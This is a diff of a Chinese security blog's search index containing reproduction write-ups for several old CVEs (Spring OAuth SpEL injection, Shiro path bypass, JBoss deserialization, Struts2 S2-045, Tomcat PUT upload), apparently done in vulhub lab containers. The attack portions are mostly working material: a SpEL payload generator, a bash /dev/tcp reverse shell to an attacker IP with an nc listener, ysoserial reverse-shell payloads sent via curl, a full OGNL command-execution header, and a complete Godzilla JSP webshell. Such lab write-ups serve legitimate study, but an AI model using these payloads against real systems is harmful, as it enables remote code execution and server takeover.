@@ -1,6 +1,90 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Spring Security OAuth 远程代码执行漏洞 CVE-2016-4977</title>
+    <url>/2026/02/04/CVE-2016-4977/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li><font style="color:rgb(0, 0, 0);">Spring Security OAuth 1.0.0 - 1.0.5</font></li>
+<li><font style="color:rgb(0, 0, 0);">Spring Security OAuth 2.0.0 - 2.0.9</font></li>
+<li><font style="color:rgb(0, 0, 0);">Spring Security OAuth 2.0 - 2.0.14</font></li>
+<li><font style="color:rgb(0, 0, 0);">Spring Security OAuth 2.1 - 2.1.1</font></li>
+<li><font style="color:rgb(0, 0, 0);">Spring Security OAuth 2.2 - 2.2.1</font></li>
+<li><font style="color:rgb(0, 0, 0);">Spring Security OAuth 2.3 - 2.3.2</font></li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>SpEL 表达式注入</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，进行反弹 shell，写入木马</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>当授权请求中的 scope 参数不合法，Spring 会调用默认的 WhitelabelApprovalEndpoint 生成错误页面，Spring 视图解析器解析错误模板，将 ${errorSummary} 占位符替换成含用户输入的错误描述字符串，攻击者可以构造恶意 payload 带入到页面内容，Spring 渲染引擎未能识别用户输入数据，会将 ${} 包裹的内容再次交给 SpEL 解析器处理，敏感命令得以执行</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/spring/CVE-2016-4977</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2016-4977/1773371638149.png" alt="1773371638149"></p>
+<p>访问构造的 url，报错信息含构造计算式结果，说明存在注入点</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://公网ip:8080/oauth/authorize?response_type=${2*3}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2016-4977/1773371666253.png" alt="1773371666253"></p>
+<p>攻击脚本，python3</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">message = input('Enter message to encode:')</span><br><span class="line"></span><br><span class="line">poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])</span><br><span class="line"></span><br><span class="line">for ch in message[1:]:</span><br><span class="line"></span><br><span class="line">   poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch) </span><br><span class="line"></span><br><span class="line">poc += ')}'</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在 python 脚本对话框输入反弹 shell 命令，bash -i /dev/tcp/ 攻击机 ip/监听端口 0&gt;&amp;1</p>
+<p><img src="/2026/02/04/CVE-2016-4977/1773371705353.png" alt="1773371705353"></p>
+<p>开启监听，nc -lvvp 监听端口</p>
+<p><img src="/2026/02/04/CVE-2016-4977/1773371847771.png" alt="1773371847771"></p>
+<p>注入 payload 到 url，并访问</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://公网ip:8080/oauth/authorize?response_type=脚本生成的payload&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2016-4977/1773371874911.png" alt="1773371874911"></p>
+<p>成功连接，虽然连接不稳定</p>
+<p><img src="/2026/02/04/CVE-2016-4977/1773371903717.png" alt="1773371903717"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Spring</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache Shiro 认证绕过漏洞 CVE-2010-3863</title>
+    <url>/2026/02/08/CVE-2010-3863/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Apache Shiro 1.0.0-incubating</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>权限绕过</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><ul>
+<li>在 Shiro 配置文件中设置了基于路径的访问控制规则</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>登录管理后台，信息泄露</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Shiro1.1.0 版本之前进行安全校验前缺少对 URL 标准化处理，Shiro 拦截器执行的是严格的字符串匹配或者正则匹配，就会认为/./admin 与/admin/不同（./当前目录，../上一级目录）；后端 Web 容器为了兼容性，会自动解析 URL 中的相对路径符号</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/shiro/CVE-2010-3863</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2026/02/08/CVE-2010-3863/1770523893257-9bf3a2eb-59f1-4a14-97cf-59fc3c0f1a88.png"></p>
+<p>用 burpsuite 抓取 http://靶机 ip:8080/admin/</p>
+<p><img src="/2026/02/08/CVE-2010-3863/1773377933167.png" alt="1773377933167"></p>
+<p>发送到 Repeater 模块</p>
+<p><img src="/2026/02/08/CVE-2010-3863/1773377963803.png" alt="1773377963803"></p>
+<p>直接发送会返回 302，重定向到登录页面</p>
+<p><img src="/2026/02/08/CVE-2010-3863/1773377976393.png" alt="1773377976393"></p>
+<p>修改路径/./admin/</p>
+<p><img src="/2026/02/08/CVE-2010-3863/1773377992451.png" alt="1773377992451"></p>
+<p>发送后返回 200，绕过登录</p>
+<p><img src="/2026/02/08/CVE-2010-3863/1773378034342.png" alt="1773378034342"></p>
+<p>直接访问没办法直接复现，可能原因是浏览器自动帮忙修复错误的 URL，而 Burpsuite 不会修复</p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Shiro</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Apache Struts 2 远程代码执行漏洞 CVE-2013-2251</title>
     <url>/2026/02/03/CVE-2013-2251/</url>
     <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
@@ -131,109 +215,150 @@
       </tags>
   </entry>
   <entry>
-    <title>Spring Security OAuth 远程代码执行漏洞 CVE-2016-4977</title>
-    <url>/2026/02/04/CVE-2016-4977/</url>
+    <title>JBoss 反序列化漏洞 CVE-2017-12149</title>
+    <url>/2026/02/13/CVE-2017-12149/</url>
     <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li><font style="color:rgb(0, 0, 0);">Spring Security OAuth 1.0.0 - 1.0.5</font></li>
-<li><font style="color:rgb(0, 0, 0);">Spring Security OAuth 2.0.0 - 2.0.9</font></li>
-<li><font style="color:rgb(0, 0, 0);">Spring Security OAuth 2.0 - 2.0.14</font></li>
-<li><font style="color:rgb(0, 0, 0);">Spring Security OAuth 2.1 - 2.1.1</font></li>
-<li><font style="color:rgb(0, 0, 0);">Spring Security OAuth 2.2 - 2.2.1</font></li>
-<li><font style="color:rgb(0, 0, 0);">Spring Security OAuth 2.3 - 2.3.2</font></li>
+<li>JBoss AS 5.x - JBoss AS 6.1.0.Final</li>
 </ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>SpEL 表达式注入</p>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>Java 反序列化</p>
 <h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，进行反弹 shell，写入木马</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>当授权请求中的 scope 参数不合法，Spring 会调用默认的 WhitelabelApprovalEndpoint 生成错误页面，Spring 视图解析器解析错误模板，将 ${errorSummary} 占位符替换成含用户输入的错误描述字符串，攻击者可以构造恶意 payload 带入到页面内容，Spring 渲染引擎未能识别用户输入数据，会将 ${} 包裹的内容再次交给 SpEL 解析器处理，敏感命令得以执行</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/spring/CVE-2016-4977</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><ul>
+<li>http-invoker.sar 必须处于部署状态</li>
+<li>ReadOnlyAccessFilter 过滤器映射</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，反弹 shell</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>在 JBoss AS 5.x 或 6.x 中，引入名为 ReadOnlyAccessFilter 过滤器，其默认映射路径为/invoker/readonly，该路径在默认配置下无需身份验证就可访问，该过滤器处理客户端发送的 POST 请求数据时，直接获取请求体的输入流调用 readObject () 方法进行反序列化操作。在还原对象过程中，系统未对传入二进制流进行安全过滤、字节码校验或白名单限制，攻击者可以构造恶意序列化对象，恶意二进制数据通过 HTTP 请求发送到靶机，JBoss 在解析对象时，自动触发对象内部嵌套的恶意代码，执行恶意命令</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/jboss/CVE-2017-12149</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/2026/02/04/CVE-2016-4977/1773371638149.png" alt="1773371638149"></p>
-<p>访问构造的 url，报错信息含构造计算式结果，说明存在注入点</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://公网ip:8080/oauth/authorize?response_type=${2*3}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="/2026/02/13/CVE-2017-12149/1773507525350.png" alt="1773507525350"></p>
+<p>访问 http://靶机 ip:8080/invoker/readonly，返回 500，说明存在漏洞</p>
+<p><img src="/2026/02/13/CVE-2017-12149/1773507561810.png" alt="1773507561810"></p>
+<p>下载攻击工具并检查是否有 Java 环境</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ysoserial.jar</span><br><span class="line">#检查Java环境</span><br><span class="line">java -version</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/2026/02/04/CVE-2016-4977/1773371666253.png" alt="1773371666253"></p>
-<p>攻击脚本，python3</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">message = input('Enter message to encode:')</span><br><span class="line"></span><br><span class="line">poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])</span><br><span class="line"></span><br><span class="line">for ch in message[1:]:</span><br><span class="line"></span><br><span class="line">   poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch) </span><br><span class="line"></span><br><span class="line">poc += ')}'</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="/2026/02/13/CVE-2017-12149/1773507621279.png" alt="1773507621279"></p>
+<p>使用 ysoserial 生成序列化数据</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 "touch /tmp/success" &gt; payload.ser</span><br></pre></td></tr></tbody></table></figure>
 
-<p>在 python 脚本对话框输入反弹 shell 命令，bash -i /dev/tcp/ 攻击机 ip/监听端口 0&gt;&amp;1</p>
-<p><img src="/2026/02/04/CVE-2016-4977/1773371705353.png" alt="1773371705353"></p>
-<p>开启监听，nc -lvvp 监听端口</p>
-<p><img src="/2026/02/04/CVE-2016-4977/1773371847771.png" alt="1773371847771"></p>
-<p>注入 payload 到 url，并访问</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://公网ip:8080/oauth/authorize?response_type=脚本生成的payload&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="/2026/02/13/CVE-2017-12149/1773507653348.png" alt="1773507653348"></p>
+<p>发送恶意 payload</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">curl -X POST http://靶机ip:8080/invoker/readonly --data-binary @payload.ser</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/2026/02/04/CVE-2016-4977/1773371874911.png" alt="1773371874911"></p>
-<p>成功连接，虽然连接不稳定</p>
-<p><img src="/2026/02/04/CVE-2016-4977/1773371903717.png" alt="1773371903717"></p>
+<p><img src="/2026/02/13/CVE-2017-12149/1773507692670.png" alt="1773507692670"></p>
+<p>进入容器 tmp 目录，发现 success，说明成功执行命令</p>
+<p><img src="/2026/02/13/CVE-2017-12149/1773507717667.png" alt="1773507717667"></p>
+<p>下面进行反弹 shell，开启 nc 监听端口</p>
+<p><img src="/2026/02/13/CVE-2017-12149/1773507754209.png" alt="1773507754209"></p>
+<p>执行命令替换为反弹 shell 执行命令</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,反弹shell的base64编码}|{base64,-d}|{bash,-i}" &gt; payload.ser</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/13/CVE-2017-12149/1773507791344.png" alt="1773507791344"></p>
+<p>发送恶意 payload</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">curl -X POST http://靶机ip:8080/invoker/readonly --data-binary @payload.ser</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/13/CVE-2017-12149/1773507874613.png" alt="1773507874613"></p>
+<p>成功连接</p>
+<p><img src="/2026/02/13/CVE-2017-12149/1773507911281.png" alt="1773507911281"></p>
 ]]></content>
       <categories>
         <category>漏洞</category>
       </categories>
       <tags>
         <tag>CVE</tag>
-        <tag>Spring</tag>
+        <tag>JBoss</tag>
       </tags>
   </entry>
   <entry>
-    <title>Tomcat 任意文件写入漏洞 CVE-2017-12615</title>
-    <url>/2026/02/25/CVE-2017-12615/</url>
-    <content><![CDATA[<h2 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h2><ul>
-<li>Apache Tomcat 7.0.0 - 7.0.79</li>
+    <title>Struts2 远程代码执行漏洞 CVE-2017-5638</title>
+    <url>/2026/02/04/CVE-2017-5638/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Struts 2.3.5 – 2.3.31</li>
+<li>Struts 2.5 – 2.5.10</li>
 </ul>
-<h2 id="漏洞类型："><a href="#漏洞类型：" class="headerlink" title="漏洞类型："></a>漏洞类型：</h2><p>任意文件写入漏洞</p>
-<h2 id="操作系统限制："><a href="#操作系统限制：" class="headerlink" title="操作系统限制："></a>操作系统限制：</h2><p>Windows</p>
-<h2 id="配置要求："><a href="#配置要求：" class="headerlink" title="配置要求："></a>配置要求：</h2><ul>
-<li>需开启 readonly = false</li>
-</ul>
-<h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>写入敏感文件，例如用木马 getshell</p>
-<h2 id="利用原理："><a href="#利用原理：" class="headerlink" title="利用原理："></a>利用原理：</h2><p>Windows 特性，在文件名后面加空格、/、::$DATA，系统会自动忽略后缀</p>
-<h2 id="绕过手段："><a href="#绕过手段：" class="headerlink" title="绕过手段："></a>绕过手段：</h2><h3 id="斜杠绕过："><a href="#斜杠绕过：" class="headerlink" title="斜杠绕过："></a>斜杠绕过：</h3><p>PUT /文件名.jsp/</p>
-<p><img src="/2026/02/25/CVE-2017-12615/1773153480147.png" alt="1773153480147"></p>
-<h3 id="空字符绕过："><a href="#空字符绕过：" class="headerlink" title="空字符绕过："></a>空字符绕过：</h3><p>PUT /文件名.jsp%20（空格）</p>
-<p><img src="/2026/02/25/CVE-2017-12615/1773153516967.png" alt="1773153516967"></p>
-<h3 id="NTFS流绕过："><a href="#NTFS流绕过：" class="headerlink" title="NTFS流绕过："></a>NTFS 流绕过：</h3><p>PUT /文件名.jsp::$DATA</p>
-<p><img src="/2026/02/25/CVE-2017-12615/1773153597456.png" alt="1773153597456"></p>
-<h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 拉取dockers镜像，将端口映射到8081，访问公网地址:8081</span></span><br><span class="line">docker run -d -p 8081:8080 --name tomcat-7070 tomcat:7.0.70</span><br><span class="line"><span class="comment"># 镜像默认没开readonly=false，用sed强行改写</span></span><br><span class="line">docker <span class="built_in">exec</span> -it tomcat-7070 sed -i <span class="string">'/&lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;\/servlet-class&gt;/a &lt;init-param&gt;\n&lt;param-name&gt;readonly&lt;\/param-name&gt;\n&lt;param-value&gt;false&lt;\/param-value&gt;\n&lt;\/init-param&gt;'</span> /usr/local/tomcat/conf/web.xml</span><br><span class="line"><span class="comment"># 检查是否插入成功，出现&lt;param-value&gt;false&lt;/param-value&gt;即为成功，不然直接复现漏洞会失败，出现401响应码</span></span><br><span class="line">docker <span class="built_in">exec</span> tomcat-7070 grep -B 5 -A 5 <span class="string">"readonly"</span> /usr/local/tomcat/conf/web.xml</span><br><span class="line"><span class="comment"># 重启容器</span></span><br><span class="line">docker restart tomcat-7070</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>OGNL 表达式注入</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行命令，可以执行各种敏感操作，例如任意文件读取，植入木马，内网探测</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>漏洞产生主要原因是 Struts2 有一个复杂功能，给错误信息赋动态变量，构造的 payload 通过错误信息进入到动态变量，后续通过动态变量抛出报错信息同时执行敏感命令。Struts2 默认使用 Jakarta 库来解析上传文件，通过构造异常的 Content-Type，Jakarta 解析器无法识别并抛出该字符串错误，Struts2 将错误转化为可读错误提示，findText () 函数解析时候，错误信息内有 %(# 符号，识别为需要计算的表达式，OGNL 引擎解析并执行括号里面的 Java 代码，即敏感命令</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-045</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
 
-<p>用 burpsuite 抓取 http://公网地址: 8081 数据包</p>
-<p><img src="/2026/02/25/CVE-2017-12615/1773153640278.png" alt="1773153640278"></p>
-<p>发送到 Repeater 模块，再修改 Repeater 设置，勾选红框中的选项</p>
-<p><img src="/2026/02/25/CVE-2017-12615/1773153732050.png" alt="1773153732050"></p>
-<p>可以用 jsp 一句话木马文件，这里用哥斯拉生成 jsp 文件</p>
-<p><img src="/2026/02/25/CVE-2017-12615/1773153753543.png" alt="1773153753543"></p>
-<p>有效载荷选 JavaDynamicPayload，再点生成，选择 jsp 文件</p>
-<p><img src="/2026/02/25/CVE-2017-12615/1773153773311.png" alt="1773153773311"></p>
-<p>选择保存路径，并修改文件名字</p>
-<p><img src="/2026/02/25/CVE-2017-12615/1773153792347.png" alt="1773153792347"></p>
-<p>成功生成</p>
-<p><img src="/2026/02/25/CVE-2017-12615/1773153810890.png" alt="1773153810890"></p>
-<p>复制源代码</p>
-<figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;%! String xc=<span class="string">"3c6e0b8a9c15224a"</span>; String pass=<span class="string">"pass"</span>; String md5=md5(pass+xc); <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>{<span class="keyword">public</span> <span class="title function_">X</span><span class="params">(ClassLoader z)</span>{<span class="built_in">super</span>(z);}<span class="keyword">public</span> Class <span class="title function_">Q</span><span class="params">(<span class="type">byte</span>[] cb)</span>{<span class="keyword">return</span> <span class="built_in">super</span>.defineClass(cb, <span class="number">0</span>, cb.length);} }<span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s,<span class="type">boolean</span> m){ <span class="keyword">try</span>{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(<span class="string">"AES"</span>);c.init(m?<span class="number">1</span>:<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(),<span class="string">"AES"</span>));<span class="keyword">return</span> c.doFinal(s); }<span class="keyword">catch</span> (Exception e){<span class="keyword">return</span> <span class="literal">null</span>; }} <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">md5</span><span class="params">(String s)</span> {<span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="keyword">try</span> {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(<span class="string">"MD5"</span>);m.update(s.getBytes(), <span class="number">0</span>, s.length());ret = <span class="keyword">new</span> <span class="title class_">java</span>.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();} <span class="keyword">catch</span> (Exception e) {}<span class="keyword">return</span> ret; } <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception {Class base64;<span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="keyword">try</span> {base64=Class.forName(<span class="string">"java.util.Base64"</span>);<span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">"getEncoder"</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);value = (String)Encoder.getClass().getMethod(<span class="string">"encodeToString"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] { <span class="type">byte</span>[].class }).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] { bs });} <span class="keyword">catch</span> (Exception e) {<span class="keyword">try</span> { base64=Class.forName(<span class="string">"sun.misc.BASE64Encoder"</span>); <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.newInstance(); value = (String)Encoder.getClass().getMethod(<span class="string">"encode"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] { <span class="type">byte</span>[].class }).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] { bs });} <span class="keyword">catch</span> (Exception e2) {}}<span class="keyword">return</span> value; } <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] base64Decode(String bs) <span class="keyword">throws</span> Exception {Class base64;<span class="type">byte</span>[] value = <span class="literal">null</span>;<span class="keyword">try</span> {base64=Class.forName(<span class="string">"java.util.Base64"</span>);<span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">"getDecoder"</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);value = (<span class="type">byte</span>[])decoder.getClass().getMethod(<span class="string">"decode"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] { String.class }).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] { bs });} <span class="keyword">catch</span> (Exception e) {<span class="keyword">try</span> { base64=Class.forName(<span class="string">"sun.misc.BASE64Decoder"</span>); <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.newInstance(); value = (<span class="type">byte</span>[])decoder.getClass().getMethod(<span class="string">"decodeBuffer"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] { String.class }).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] { bs });} <span class="keyword">catch</span> (Exception e2) {}}<span class="keyword">return</span> value; }%&gt;&lt;%</span><br><span class="line"><span class="keyword">try</span>{</span><br><span class="line"><span class="type">byte</span>[] data=base64Decode(request.getParameter(<span class="string">"pass"</span>));</span><br><span class="line">data=x(data, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span>(data!=<span class="literal">null</span>){</span><br><span class="line">X x=<span class="keyword">new</span> <span class="title class_">X</span>(<span class="built_in">this</span>.getClass().getClassLoader());</span><br><span class="line">Class&lt;?&gt; c=x.Q(data);</span><br><span class="line">Object o=c.newInstance();</span><br><span class="line">out.print(base64Encode(x(o,<span class="literal">true</span>)));</span><br><span class="line">}</span><br><span class="line">}<span class="keyword">catch</span> (Exception e){}</span><br><span class="line">%&gt;</span><br></pre></td></tr></tbody></table></figure>
+<p>可以通过 docker ps 查看镜像</p>
+<p><img src="/2026/02/04/CVE-2017-5638/1773317613909.png" alt="1773317613909"></p>
+<p>用 burpsuite 抓取 http://公网: 8080 流量包</p>
+<p><img src="/2026/02/04/CVE-2017-5638/1773317657503.png" alt="1773317657503"></p>
+<p>使用 Repeater 模块</p>
+<p><img src="/2026/02/04/CVE-2017-5638/1773317777800.png" alt="1773317777800"></p>
+<p>随便添加参数</p>
+<p><img src="/2026/02/04/CVE-2017-5638/1773317706752.png" alt="1773317706752"></p>
+<p>修改 Content-Type 内容，换成下面的恶意 payload，并删掉加入的参数</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">%{(#nick='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmds={'id'}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</span><br></pre></td></tr></tbody></table></figure>
 
-<p>修改包文，请求头改为 PUT，绕过手段这里选用斜杠绕过，最后放 jsp 源码</p>
-<p><img src="/2026/02/25/CVE-2017-12615/1773153842406.png" alt="1773153842406"></p>
-<p>返回包文的响应码为 201 即成功</p>
-<p><img src="/2026/02/25/CVE-2017-12615/1773153878002.png" alt="1773153878002"></p>
